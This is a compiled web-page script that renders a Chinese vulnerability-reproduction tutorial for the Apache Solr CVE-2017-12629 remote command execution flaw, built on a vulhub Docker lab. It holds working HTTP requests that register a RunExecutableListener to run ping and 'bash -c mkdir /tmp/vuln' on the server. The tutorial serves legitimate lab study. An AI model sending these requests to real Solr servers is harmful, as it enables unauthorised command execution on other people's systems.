(window.webpackJsonp=window.webpackJsonp||[]).push([[173],{2798:function(s,a,n){s.exports=n.p+"assets/img/ec27d0b9-f86d-43b7-9fe4-1bba02cbf334.c9f3cf35.png"},2799:function(s,a,n){s.exports=n.p+"assets/img/image-20220307151501330.e8d1148f.png"},2800:function(s,a,n){s.exports=n.p+"assets/img/53ffedcf-5cc3-42cf-9623-a076ed001ac8.64629bac.png"},2801:function(s,a,n){s.exports=n.p+"assets/img/567692f5-4845-439f-b747-020011068da8.276f5ada.png"},3557:function(s,a,n){"use strict";n.r(a);var t=n(64),e=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"apache-solr-rce-远程命令执行漏洞-cve-2017-12629"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#apache-solr-rce-远程命令执行漏洞-cve-2017-12629"}},[s._v("#")]),s._v(" Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。")]),s._v(" "),a("h2",{attrs:{id:"影响版本"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("Apache Solr < 7.1")]),a("br"),s._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/vulhub/vulhub.git\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" vulhub/solr/CVE-2017-12629\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker-compose")]),s._v(" build\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker-compose")]),s._v(" up "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("先请求url地址获取 core 内容")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("/solr/admin/cores\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("通过查看代码，能够触发命令执行的事件有两个："),a("code",[s._v("postCommit")]),s._v(" 和"),a("code",[s._v("newSearcher")])]),s._v(" "),a("p",[a("img",{attrs:{src:n(2798),alt:"ec27d0b9-f86d-43b7-9fe4-1bba02cbf334"}})]),s._v(" "),a("p",[s._v("第一个请求包用于载入缓存中")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("exe : ping  执行的命令\ndir: 命令存在的目录位置\nargs:命令参数\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("如下请求包执行的是 /bin/ping 1.1.1.1")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("POST /solr/demo/config HTTP/1.1\nHost:\nConnection: close\nContent-Type: application/json  \nContent-Length: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("198")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"add-listener"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"event"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"postCommit"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"name"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"newlistener-1"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"class"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"solr.RunExecutableListener"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"exe"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ping"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"dir"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/bin/"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"args"')]),s._v(":"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1.1.1.1"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[a("img",{attrs:{src:n(2799),alt:"image-20220307151501330"}})]),s._v(" "),a("p",[s._v("第二个请求包用于更新缓存并执行命令")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("POST /solr/demo/update\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"id"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("进入docker容器查看发现命令已经执行")]),s._v(" "),a("p",[a("img",{attrs:{src:n(2800),alt:"53ffedcf-5cc3-42cf-9623-a076ed001ac8"}})]),s._v(" "),a("p",[s._v("使用 newSearcher可以直接加载入缓存执行命令")]),s._v(" "),a("div",{staticClass:"language-shell line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-shell"}},[a("code",[s._v("POST /solr/demo/config HTTP/1.1\nHost:\nConnection: close\nContent-Type: application/json  \nContent-Length: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("198")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"add-listener"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"event"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"newSearcher"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"name"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"newlistener-2"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"class"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"solr.RunExecutableListener"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"exe"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"bash"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"dir"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/bin/"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"args"')]),s._v(":"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("\n         "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-c"')]),s._v(",\n         "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mkdir /tmp/vuln"')]),s._v(",\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br")])]),a("p",[s._v("成功执行了创建文件的命令")]),s._v(" "),a("p",[a("img",{attrs:{src:n(2801),alt:"567692f5-4845-439f-b747-020011068da8"}})]),s._v(" "),a("p",[s._v("如果想要执行其他命令,则需要命令的的位置，例如执行ping，则需要设置dir参数为 /usr/bin/ping 或者 /bin/ping，如果需要检测漏洞是否存在则可以使用 dnslog来检测")])],1)}),[],!1,null,null,null);a.default=e.exports}}]);